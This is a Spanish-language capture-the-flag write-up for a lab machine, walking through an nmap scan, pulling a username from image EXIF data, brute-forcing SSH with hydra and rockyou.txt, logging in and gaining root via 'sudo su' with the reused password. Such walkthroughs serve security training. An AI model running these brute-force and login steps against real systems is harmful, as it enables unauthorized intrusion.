# SOLUCION-MAQUINA-borazuwarah

En esta maquina se usan tecnicas de fuerza bruta, curiosidad para encontrar el usuario, y  sentido "comun"  para escalar privilegios una vez estado dentro de ella.

#1. RECONOCIMIENTO
--------------

Se hace un Escaneo de puertos:

    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
    | ssh-hostkey: 
    |   256 3d:fd:d7:c8:17:97:f5:12:b1:f5:11:7d:af:88:06:fe (ECDSA)
    |_  256 43:b3:ba:a9:32:c9:01:43:ee:62:d0:11:12:1d:5d:17 (ED25519)
    80/tcp open  http    Apache httpd 2.4.59 ((Debian))
    |_http-server-header: Apache/2.4.59 (Debian)
    |_http-title: Site doesn't have a title (text/html).
    MAC Address: 02:42:AC:11:00:02 (Unknown)
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 7.35 seconds
#2. Explotacion
----------
1.Primer vector de explotacion
--------------------------

Una vez tenemos el reconocimeinto hecho sobre la maquina, al adentrar a la pagina web que corre el puerto 80, y realizar fuzzing, no encontramos ningun directorio "expuesto".

2.Segundo vector de explotacion:
-------------------------------
al ver el puerto ssh expuesto y buscar  alguna vulnerabilidad que tenga la version (OpenSSH 9.2p1 Debian 2+deb12u2).Pero no encontramos nada que se pueda usar.

3.Tercer vector de explotacion:
-------------------------------
En un entorno real al momento de auditar , es poco probable de que un "usuario" o "password" este a la vista, pues, al momento de entrar a la pagina web , lo unico que nos aparece es una imagen.

Esta si la descargamos, y vemos mas a detalle con la herrmienta nos sale:


    exiftool imagenkinder.jpeg
    ExifTool Version Number         : 13.25
    File Name                       : imagenkinder.jpeg
    Directory                       : .
    File Size                       : 19 kB
    File Modification Date/Time     : 2025:12:26 16:04:57-04:00
    File Access Date/Time           : 2025:12:26 16:07:27-04:00
    File Inode Change Date/Time     : 2025:12:26 16:04:57-04:00
    File Permissions                : -rw-rw-r--
    File Type                       : JPEG
    File Type Extension             : jpg
    MIME Type                       : image/jpeg
    JFIF Version                    : 1.01
    Resolution Unit                 : None
    X Resolution                    : 1
    Y Resolution                    : 1
    XMP Toolkit                     : Image::ExifTool 12.76
    Description                     : ---------- User: borazuwarah ----------
    Title                           : ---------- Password:  ----------
    Image Width                     : 455
    Image Height                    : 455
    Encoding Process                : Baseline DCT, Huffman coding
    Bits Per Sample                 : 8
    Color Components                : 3
    Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
    Image Size                      : 455x455
    Megapixels                      : 0.20
logramos obtener el nombre usuario.

#Explotacion final
-----------

hacemos un ataque de fuerza bruta al puerto ssh con el usuario que encontramos:

        hydra 172.17.0.2 ssh -l borazuwarah  -P rockyou.txt
        Hydra (https://github.com/
        vanhauser-thc/thc-hydra) starting at 2025-12-26 22:19:28
        [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
        [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
        [DATA] attacking ssh://172.17.0.2:22/
        [22][ssh] host: 172.17.0.2   login: borazuwarah   password: 123456
        1 of 1 target successfully completed, 1 valid password found
        [WARNING] Writing restore file because 1 final worker threads did not complete until end.
        [ERROR] 1 target did not resolve or could not be connected
        [ERROR] 0 target did not complete
        Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-12-26 22:19:34
        
Nos conrectamos con el usuario y password que logramos obtener:

        ssh borazuwarah@172.18.0.2 
        
                                                                                                                                                                                                
        └─$ ssh borazuwarah@172.17.0.2 
        borazuwarah@172.17.0.2's password: 
        Linux d3ac92156e98 6.16.8+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.16.8-1kali1 (2025-09-24) x86_64
        
        The programs included with the Debian GNU/Linux system are free software;
        the exact distribution terms for each program are described in the
        individual files in /usr/share/doc/*/copyright

una vez que ya entramos probamos por sentido comun haber si la password del usuario root fue reutilizada, es deicr si es la misma que se uso para acceder a la maquina:

        Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
        permitted by applicable law.
        borazuwarah@d3ac92156e98:~$ su root
        Password: 
        su: Authentication failure
        borazuwarah@d3ac92156e98:~$ sudo su
        [sudo] password for borazuwarah: 
        root@d3ac92156e98:/home/borazuwarah# whoami
        root
        root@d3ac92156e98:/home/borazuwarah# 
        
#CONCLUSIONES:
--------------
la maquina para vulnerarla fue cuestion de curiosidad , ya que los posibles vectores de ataque como el puerto 80, no es una pagina interactiva (no se puede iniciar sesion, realizar peticiones, etc). por otro lado en el servicio ssh, es muy dificil usar un ataque de fuerza bruta tanto para conseguir el usuario y la password.

#RECOMENDACIONES
----------------

-actualizacion del servicio ssh a la ultima version (version 9.8)
-una passwoord mucho mas segura
        
